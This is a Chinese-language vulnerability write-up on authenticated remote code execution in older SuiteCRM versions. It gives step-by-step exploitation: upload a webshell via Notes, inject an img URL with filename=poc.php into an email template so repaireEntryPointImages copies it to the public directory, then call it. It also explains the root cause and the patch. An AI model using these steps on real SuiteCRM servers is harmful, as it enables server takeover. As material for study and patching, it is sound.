# SuiteCRM远程命令执行漏洞利用

## 利用条件：

- < 7.12.3
- < 8.0.2

## 利用方法：

### 步骤一：用户登录，进入`Notes`功能上传`Notes`附件，返回ID：

![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/OA产品漏洞/SuiteCRM/img/返回ID.png)

### 步骤二：检查附件内容

```bash
/index.php?entryPoint=download&type=Notes&id=<note_id>
```

![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/OA产品漏洞/SuiteCRM/img/检查附件内容.png)

### 步骤三：进入`Email-Templates`功能，新建邮件模板并篡改`body_html`和`body`参数

```bash
<img src="http://<ip>/index.php?entryPoint=download&type=Notes&id=<note_id>&filename=poc.php"/>
```

![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/OA产品漏洞/SuiteCRM/img/邮件模版body_html参数.png)

### 步骤四：保存后webshell被写入：

```bash
http://<ip>/legacy/public/<note_id>.php
```

![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/OA产品漏洞/SuiteCRM/img/webshell写入.png)

## 漏洞原理：

1. 用户通过`Notes`上传webshell；
2. SuiteCRM系统`Notes`模块将webshell以UUID的方式存储在`upload`目录；
3. 验证能否通过`/index.php?entryPoint=download&type=Notes&id=<note_id>`下载附件；
4. 创建一个电子邮件模板，模板html源码中包含类似于`<img src='localhost/index.php?entryPoint=download&type=Notes&id=UUID&filename=poc.php'`的匹配项；
5. 保存或者重新加载邮件模板，SuiteCRM执行`repaireEntryPointImages`将webshell复制到`public`目录；
6. 通过`http://***/public/UUID.php`执行命令。

## 漏洞分析：

SuiteCRM软件支持用户定义邮件模板。补丁修复位于`modules\EmailTemplates\EmailTemplate.php`：

![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/OA产品漏洞/SuiteCRM/img/补丁修复.png)

`repaireEntryPointImages`读取`html页面`中解析`<img src=`标签，提取文件后缀`fileExtension`和`id`，随后调用`makePublicImage`函数将`upload`目录文件写入到`public`，且没有对后缀名做检查。提取文件的URL格式为：

```bash
/index.php?entryPoint=download&type=Notes&id=UUID&filename=FILENAME
```

经过身份认证的用户可以通过`/index.php?entryPoint=download&type=Notes&id=<note-id>`链接Notes模块中的附件：

![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/OA产品漏洞/SuiteCRM/img/链接附件代码.png)

`repaireEntryPointImages`由`retrieve`函数调用，在用户保存和访问电子邮件模板时都会触发该功能：

![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/OA产品漏洞/SuiteCRM/img/功能触发代码.png)

SuiteCRM允许用户创建邮件模板，并支持添加附件，实际上以uuid的方式存储在本地文件系统：

![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/OA产品漏洞/SuiteCRM/img/创建邮件模版.png)

同时用户可以将任意附件添加到邮件模板，但不能被php解析，但是利用`repaireEntryPointImages`函数，如果邮件正文中包含类似内容如下：

```bash
img src='localhost/index.php?entryPoint=download&type=Notes&id=UUID&filename=poc.php'
```

`Notes`模块下的附件就可以被复制写入到`public`目录。
